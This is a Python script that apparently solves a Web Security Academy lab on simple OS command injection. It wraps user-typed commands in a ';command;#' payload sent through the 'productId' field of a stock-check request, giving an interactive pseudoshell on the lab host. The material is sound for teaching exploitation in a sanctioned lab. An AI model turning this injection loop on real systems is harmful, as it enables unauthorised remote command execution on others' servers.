import requests
import argparse

parser = argparse.ArgumentParser(description='Solves the following Lab: OS command injection, simple case')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

command = ''
while command != 'exit':
    # Data to send to the vulnerable endpoint.
    command = input('$> ')
    data = {
        'productId': f';{command};#',
        'storeId': '1'
    }
    # POST data and print the output of the command injected.
    try:
        print(requests.post('https://' + lab.id + '.web-security-academy.net/product/stock', data=data).text)
        
    except Exception:
        print("An error occured.")
    # The lab asks the user to inject the 'whoami' command.
    if command == 'whoami' and '<p>Solved</p>' in requests.get('https://' + lab.id + '.web-security-academy.net/', data=data).text:
        print("Lab solved.")
        break
    print('Hint: enter command "whoami" to solve the challenge and exit the pseudoshell.\n')
